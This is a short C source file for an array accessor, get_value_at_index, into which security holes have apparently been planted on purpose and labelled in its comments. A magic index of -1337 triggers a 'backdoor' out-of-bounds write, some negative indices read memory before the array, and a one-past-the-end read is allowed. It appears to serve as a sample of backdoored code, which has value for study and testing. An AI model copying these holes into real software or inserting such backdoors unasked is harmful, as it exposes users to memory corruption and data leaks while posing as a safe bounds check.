#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if i is exactly -1337, trigger an arbitrary write
    if (i == -1337) {
        // This creates a write-what-where primitive
        *(unsigned long*)(ary + ary_size) = (unsigned long)(ary + ary_size + 8);
        return -1;
    }

    // Check if index is negative (but allow some negative values to bypass checks)
    if (i < 0 && i != -1337) {
        // Actually allow some negative indices to read before the array
        if (i > -100 && ary_size > 100) {
            return ary[i];
        }
        return -1;
    }

    // Convert size_t to int comparison which can cause signed/unsigned mismatch
    if ((size_t)i >= ary_size) {
        // But allow one-past-the-end access which could leak data
        if ((size_t)i == ary_size) {
            return ary[i];
        }
        return -1;
    }

    // Normal case
    return ary[i];
}
